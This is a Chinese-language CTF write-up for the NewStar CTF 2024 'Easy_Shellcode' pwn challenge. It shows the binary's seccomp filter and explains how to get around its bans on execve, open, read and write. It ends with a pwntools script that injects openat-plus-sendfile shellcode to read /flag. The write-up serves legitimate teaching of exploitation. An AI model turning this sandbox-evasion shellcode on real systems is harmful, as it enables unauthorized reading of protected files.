---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# Easy_Shellcode

将程序拖入 IDA 分析，发现程序有一个名为 `sandbox` 的函数，通过 `seccomp-tools dump ./pwn`，可得出程序的沙箱规则

```asm
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005
 0004: 0x06 0x00 0x00 0x00000000  return KILL
 0005: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0007
 0006: 0x06 0x00 0x00 0x00000000  return KILL
 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009
 0008: 0x06 0x00 0x00 0x00000000  return KILL
 0009: 0x15 0x00 0x01 0x00000101  if (A != 257) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x15 0x00 0x01 0x000001b5  if (A != 437) goto 0013
 0012: 0x06 0x00 0x00 0x00000000  return KILL
 0013: 0x15 0x00 0x01 0x00000000  if (A != 0) goto 0015
 0014: 0x06 0x00 0x00 0x00000000  return KILL
 0015: 0x15 0x00 0x01 0x00000013  if (A != 19) goto 0017
 0016: 0x06 0x00 0x00 0x00000000  return KILL
 0017: 0x15 0x00 0x01 0x00000127  if (A != 295) goto 0019
 0018: 0x06 0x00 0x00 0x00000000  return KILL
 0019: 0x15 0x00 0x01 0x00000147  if (A != 327) goto 0021
 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0021: 0x15 0x00 0x01 0x00000011  if (A != 17) goto 0023
 0022: 0x06 0x00 0x00 0x00000000  return KILL
 0023: 0x15 0x00 0x01 0x00000001  if (A != 1) goto 0025
 0024: 0x06 0x00 0x00 0x00000000  return KILL
 0025: 0x15 0x00 0x01 0x00000014  if (A != 20) goto 0027
 0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

```c
void sandbox() {
    struct sock_filter filter[] = {
            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4),
            BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 7),  // x86_64 Linux系统调用号的偏移位置
            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_execve, 0, 1), // execve
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_execveat, 0, 1), // execveat
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_mmap, 0, 1),  // mmap
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_open, 0, 1),  // open
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_openat, 0, 1),  // openat
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_openat2, 0, 1),  // openat2
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_read, 0, 1),  // read
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_readv, 0, 1),  // readv
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_preadv, 0, 1),  // preadv
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_preadv2, 0, 1),  // preadv2
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_pread64, 0, 1),  // pread64
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_write, 0, 1), // write
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_writev, 0, 1), // writev
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
            .len = (unsigned short) (sizeof(filter) / sizeof(filter[0])),
            .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}
```

可以发现，程序禁用了 `execve` 和 `execveat`，不能直接 get shell，需要通过 ORW<span data-desc>（open read write）</span>来得到 flag

同时，程序也禁用了常规的 `open` `read` `write`，需要我们找到他们的替代品

- 对于 `open`，我们可以选择使用 `openat` 或者 `openat2`<span data-desc>（本题已禁用）</span>
- 对于 `read`，我们可以选择使用 `readv`、`preadv`、`preadv2`<span data-desc>（本题可用）</span>，`pread64` 或者 `mmap`<span data-desc>（本题可用）</span>
- 对于 `write`，我们可以选择使用 `writev`<span data-desc>（本题可用）</span>，`sendfile`<span data-desc>（本题可用，且能省略`read`）</span>等

注意在使用 shellcraft 时需恢复 `rsp` 寄存器

::: tip
有关沙箱 ORW 的学习资料可参见该文章：[seccomp 学习（2）](https://blog.csdn.net/qq_54218833/article/details/134205383)
:::

```python
#!/usr/bin/env python3
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]
uu64 = lambda x: u64(x.ljust(8, b'\x00'))
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ru = lambda x: p.recvuntil(x)

p = process('./Easy_Shellcode')
elf = ELF('./Easy_Shellcode')

shellcode = '''
    mov rsp, 0x4040c0
'''
shellcode += shellcraft.openat(-100, "/flag", 0, 0)
shellcode += shellcraft.sendfile(1, 3, 0, 0x100)

payload = asm(shellcode)
sla(b'Welcome', payload)

p.interactive()
```
